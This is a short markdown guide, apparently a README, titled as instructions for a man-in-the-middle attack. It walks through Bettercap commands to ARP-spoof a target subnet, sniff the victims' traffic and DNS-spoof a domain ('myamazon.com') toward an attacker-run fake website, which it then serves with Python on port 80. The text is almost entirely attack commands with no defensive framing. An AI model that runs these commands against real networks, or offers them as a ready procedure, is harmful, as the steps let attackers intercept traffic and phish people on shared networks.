# MiTM Attack Instructions

## Setting Up Bettercap for a MiTM Attack

### 1. Install Bettercap
Download and install Bettercap from the [official website](https://www.bettercap.org/). Follow the installation instructions for your operating system.

### 2. Launch Bettercap
Run Bettercap with `sudo` to ensure necessary permissions:
```bash
sudo bettercap
```

### 3. Probe the Network
To discover devices on the network, run:
```bash
net.probe on
```

### 4. View Network Devices
To view the IP addresses of devices on the network, use:
```
net.show
```

### 5. Set ARP Spoof Target
Replace 192.168.1.* with the IP address of the device you want to attack:
```
set arp.spoof.targets 192.168.1.*
```

### 6. Enable ARP Spoofing
Activate ARP spoofing to place the attacker machine between the client and server:
```
arp.spoof on
```

### 7. Sniff Network Traffic
Start sniffing the target device’s network traffic:
```
net.sniff on
```

### 8. Stop Sniffing
After you have collected sufficient traffic, you can stop sniffing:
```
net.sniff off
```

### 9. DNS Spoofing Setup
To redirect the target device to the attacker’s fake website, set the domain to spoof:
```
set dns.spoof.domains myamazon.com
```

### 10. Activate DNS Spoofing
Enable DNS spoofing to redirect traffic:
```
dns.spoof on
```

## Running the Fake Server:
1. Open a new terminal window.
2. Navigate to the fake_server directory:
   ```bash
   cd fake_server
   ```
4. Run the fake server on port 80:
   ```
   sudo python3 -m http.server 80
   ```
